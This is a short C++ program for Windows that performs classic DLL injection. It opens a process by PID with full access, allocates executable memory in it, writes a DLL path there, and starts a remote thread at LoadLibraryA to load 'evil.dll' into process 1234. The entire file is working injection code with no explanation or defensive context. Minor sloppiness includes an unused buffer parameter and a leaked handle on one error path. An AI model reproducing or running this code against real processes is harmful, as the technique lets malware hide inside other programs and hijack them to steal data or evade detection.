#include <iostream>
#include <windows.h>


int ProcessInjection( DWORD PID, SIZE_T SIZE, LPCVOID pBuffer, LPCSTR pDllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess == NULL) {
        printf("Failed to open process with PID %d. Error: %d\n", PID, GetLastError());
        return 1;
    }

    LPVOID pBaseAddress = VirtualAllocEx(hProcess, NULL, SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (pBaseAddress == NULL) {
        printf("Failed to allocate memory in the target process. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    // Write the DLL path to the allocated memory in the target process
    BOOL isValid = WriteProcessMemory(hProcess, pBaseAddress, pDllPath, strlen(pDllPath) + 1, NULL); 

    if (!isValid) {
        printf("Failed to write to process memory. Error: %d\n", GetLastError());
        return 1;
    }

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pLoadLibrary, pBaseAddress, 0 , NULL );
    return 0;
}


int main() {

    
    const char* dllPath = "evil.dll";

    ProcessInjection( 1234, strlen(dllPath) + 1, dllPath, dllPath);


    return 0;
}